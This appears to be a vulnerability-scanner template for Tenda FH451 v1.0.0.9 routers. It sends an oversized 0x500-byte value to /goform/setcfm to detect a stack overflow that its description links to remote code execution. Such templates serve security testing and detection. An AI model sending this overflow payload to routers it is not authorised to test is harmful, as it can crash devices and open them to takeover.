http:
- body: 'funcname=save_list_data&funcpara1={{overflow_payload}}&funcpara2=aaaaaa

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: and
    type: word
    words:
    - error
    - successful
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/goform/setcfm'
  payloads:
    overflow_payload:
    - '{{''a'' * 0x500}}'
id: tenda-fh451-stack-overflow
info:
  author: vidura2
  description: 'This template detects a stack overflow vulnerability in Tenda FH451
    v1.0.0.9. The vulnerability exists in the RouteStatic function, allowing attackers
    to send overly long input data causing a buffer overflow, which could lead to
    remote code execution (RCE).

    '
  name: Tenda FH451 v1.0.0.9 - Stack Overflow
  reference:
  - https://github.com/BenJpopo/V/blob/main/Tenda/FH451/RouteStatic.md
  severity: high
  tags: tenda,overflow,rce
